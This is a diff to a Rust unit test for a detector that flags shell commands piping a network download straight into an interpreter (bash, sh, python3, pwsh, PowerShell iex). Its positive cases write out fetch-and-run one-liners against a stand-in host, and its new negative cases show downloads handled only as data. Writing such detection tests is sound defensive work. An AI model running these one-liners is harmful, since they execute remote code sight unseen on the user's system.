@@ -33,6 +33,10 @@ fn download_to_interpreter_shapes() {
         "iex (irm https://x.io/i.ps1)",
         "IEX (New-Object Net.WebClient).DownloadString('https://x.io/a')",
         "bash -c 'curl https://x.io/i.sh | sh'",
+        "curl -fsSL https://x.io/i.sh | bash -o pipefail",
+        "curl -fsSL https://x.io/i.sh | sh -e",
+        "curl -fsSL https://x.io/i.py | python3 - --user",
+        "curl -fsSL https://x.io/i.ps1 | pwsh -Command -",
     ] {
         assert!(pipes_download_to_interpreter(s), "{s}");
     }
@@ -42,6 +46,12 @@ fn download_to_interpreter_shapes() {
         "wget https://x.io/a.tar.gz",
         "cat script.sh | sh",
         "curl https://x.io | shasum",
+        // The download is data for these, not code.
+        "curl -s http://localhost:8300/v1/live | python3 -m json.tool",
+        "curl -s https://api.x.io/v1 | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+        "curl -s https://api.x.io/v1 | node scripts/summarise.js",
+        "curl -s https://api.x.io/v1 | bash -c 'jq .name'",
+        "wget -qO- https://api.x.io/v1 | perl -ne 'print if /x/'",
         "echo curl | shellcheck -",
     ] {
         assert!(!pipes_download_to_interpreter(s), "{s}");
